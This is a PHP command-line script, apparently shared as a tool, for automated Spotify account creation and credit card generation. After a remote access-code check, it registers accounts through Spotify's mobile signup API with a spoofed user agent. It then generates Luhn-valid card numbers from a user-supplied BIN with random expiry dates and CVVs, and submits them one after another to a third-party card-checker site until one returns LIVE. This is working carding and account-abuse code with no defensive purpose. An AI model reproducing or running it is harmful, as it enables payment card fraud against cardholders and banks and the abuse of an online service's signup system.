<?php
$headers   = array();
$headers[] = "User-Agent: Spotify/8.4.98 Android/25 (ASUS_X00HD)";
$headers[] = "Content-Type: application/x-www-form-urlencoded";
$headers[] = "Connection: Keep-Alive";

echo "SGB Code: ";
$code = trim(fgets(STDIN));
$cek  = curl("https://sgbteamsmg.id/api/goalfa.php?sgbcode=".$code,null,array(" "));

if ($cek[0] == "Kontol") {
    die("SGB-Code Salah!");
} elseif ($cek[0] == "Jembod") {
    die("Script Maintanance!");
} elseif ($cek[0] == "Anjay") {
    echo "\nCreated By: Gidhan Bagus Algary\n\n";
    sleep(2);
    echo "=======================\n";
    echo "Spotify Account Creator\n";
    echo "=======================\n";
    echo "Email: ";
    $email = trim(fgets(STDIN));
    echo "Pass: ";
    $pass = trim(fgets(STDIN));
    $send = curl("https://spclient.wg.spotify.com:443/signup/public/v1/account/", "iagree=true&birth_day=12&platform=Android-ARM&creation_point=client_mobile&password=".$pass."&key=142b583129b2df829de3656f9eb484e6&birth_year=2000&email=".$email."&gender=male&app_version=849800892&birth_month=12&password_repeat=".$pass,$headers);
    $data = json_decode($send[0]);

    if ($data->status !== 1) echo $data->errors->email."\n";
    echo "=======================\n";
    echo color("green","[SUKSES]")." - ".$email."|".$pass."\n";
    echo "=======================\n";
    echo "BIN: ";
    $bin = trim(fgets(STDIN));
    echo "=======================\n";

    do {
        $card  = extrap($bin);
        $valid = check($card);
        echo $valid."\n";
    } while (!strpos($valid,"[LIVE]"));

    "=======================\n";
}

function curl($url,$fields=null,$headers=null)
{
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_FOLLOWLOCATION,true);
    curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);

    if ($fields !== null) {
        curl_setopt($ch,CURLOPT_POST,true);
        curl_setopt($ch,CURLOPT_POSTFIELDS,$fields);
    }

    if ($headers !== null) {
        curl_setopt($ch,CURLOPT_HTTPHEADER,$headers);
    }

    $result   = curl_exec($ch);
    $httpcode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
    curl_close($ch);
    return array($result,$httpcode);
}

function color($color="default",$text)
{
    $arrayColor = array(
                  "grey"=>"1;30",
                  "red"=>"1;31",
                  "green"=>"1;32",
                  "yellow"=>"1;33",
                  "blue"=>"1;34",
                  "purple"=>"1;35",
                  "nevy"=>"1;36",
                  "white"=>"1;0",);
    return "\x1b[".$arrayColor[$color]."m".$text."\x1b[0m";
}

function generateYears()
{
    $randMonth = rand(1,12);
    $randYears = rand(20,25);
    $randCvv   = rand(8,800);
    $randMonth < 10 ? $randMonth = "0".$randMonth : $randMonth = $randMonth;
    $randCvv   < 100 ? $randCvv = "0".$randCvv : $randCvv = $randCvv;

    return "|".$randMonth."|20".$randYears."|".$randCvv;
}

function calculate($ccnumber,$length)
{
    $sum = 0;
    $pos = 0;
    $reversedCCnumber = strrev($ccnumber);

    while ($pos < $length-1) {
        $odd = $reversedCCnumber[$pos] * 2;

        if ($odd > 9) {
            $odd -= 9;
        }

        $sum += $odd;

        if ($pos != ($length-2)) {
            $sum += $reversedCCnumber[$pos+1];
        }

        $pos += 2;
    }

    $checkdigit = ((floor($sum / 10) + 1) * 10 - $sum) % 10;
    $ccnumber  .= $checkdigit;
    return $ccnumber;
}

function extrap($bin)
{
    if (preg_match_all("#x#si",$bin)) {
        $ccNumber = $bin;

        while (strlen($ccNumber) < 15) {
            $ccNumber .= rand(0,9);
        }

        $ccNumber = str_split($ccNumber);
        $replace  = "";

        foreach ($ccNumber as $cc=>$key) {
            $replace .= str_replace("x",rand(0,9),$key);
        }

        $Complete = calculate($replace,16);
    } else {
        $ccNumber = $bin;

        while(strlen($ccNumber) < 15){
            $ccNumber .= rand(0,9);
        }

        $Complete = calculate($ccNumber,16);
    }
    return $Complete.generateYears();
}

function check($card) {
    $headers   = array();
    $headers[] = "Origin: http://elry2cc.com";
    $headers[] = "Accept-Language: en-US,en;q=0.9";
    $headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36";
    $headers[] = "Content-Type: application/x-www-form-urlencoded; charset=UTF-8";
    $headers[] = "Accept: */*";
    $headers[] = "Referer: http://elry2cc.com/ElrY2_Checker/";
    $headers[] = "X-Requested-With: XMLHttpRequest";
    $headers[] = "Connection: keep-alive";

    $ch      = curl_init();
    $options = array(
               CURLOPT_URL=>"http://elry2cc.com/ElrY2_Checker/api.php",
               CURLOPT_RETURNTRANSFER=>true,
               CURLOPT_POST=>true,
               CURLOPT_POSTFIELDS=>"data=".urlencode($card),
               CURLOPT_HTTPHEADER=>$headers);
    curl_setopt_array($ch,$options);
    $exec   = curl_exec($ch);
    $status = json_decode($exec);

    if ($status->error == "1") {
        return color("green","[LIVE]")." - ".$card;
    } else {
        return color("red","[DIE]")." - ".$card;
    }
}
?>
